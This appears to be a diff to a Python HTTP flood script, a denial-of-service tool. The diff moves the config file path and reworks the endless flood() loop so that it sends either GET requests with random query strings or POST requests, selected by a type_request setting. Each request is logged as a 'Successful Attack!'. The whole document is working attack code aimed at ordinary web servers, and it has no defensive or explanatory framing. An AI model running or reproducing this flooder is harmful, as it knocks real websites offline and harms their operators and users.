@@ -18,7 +18,7 @@ from requests.exceptions import ConnectionError, Timeout
 
 os.system('clear')
 
-with open("info.json", "r") as f:
+with open("../info.json", "r") as f:
     data = json.load(f)
     version = data["version"]
     auther = data["auther"]
@@ -135,16 +135,16 @@ def flood(target: str) -> None:
     headers["Host"] = h
     while True:
         try:
-            # get Send
-            response = requests.get(target, headers=headers, params=generateQueryString(random.randint(1, 5)), timeout=5)
-            # post Send
-            response = requests.post(target, headers=headers, timeout=5)
+            if type_request == "GET":
+                response = requests.get(target, headers=headers, params=generateQueryString(random.randint(1, 5)), timeout=5)
+            else:
+                response = requests.post(target, headers=headers, timeout=5)
             
             
             s_color = f"{F.GREEN if response.status_code==200 else F.RED}"
             status = f"{s_color}({response.status_code}){F.RESET}"
             payload_size = f"{s_color} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
-            print(f"{status} --> {F.RESET} Successful Attack! | Payload Size: {payload_size}")
+            print(f"{status} --> {F.CYAN}{type_request}{F.RESET} Successful Attack! | Payload Size: {payload_size}")
             
         except (Timeout, OSError):
             print(f"{F.RED}( !!! ) {F.RESET}Time Out...")
